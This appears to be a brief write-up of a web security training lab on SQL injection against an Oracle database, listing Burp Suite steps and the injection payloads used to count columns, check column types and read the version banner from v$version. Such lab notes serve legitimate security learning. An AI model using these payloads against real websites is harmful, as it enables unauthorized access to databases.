# SQL injection attack, querying the database type and version on Oracle

1. SQLi: product category filter.
2. Goal: display the database version string.

### Analysis
- Website target: `https://0a7e003c04f8fdb180c20d8e00cd00ac.web-security-academy.net/`
- Use Burp suite.
- `ctrl + u`: url encode.
1. Determine the number of columns.
```sql
' order by 2--
'-- I found 2 columns.
```

2. Determine the data types of the column.
```sql
'union select 'a', null from dual--
'-- Data types are text.
```

3. Output the version of the database.
```sql
SELECT banner FROM v$version --Oracle
'union select banner, null from v$version--
```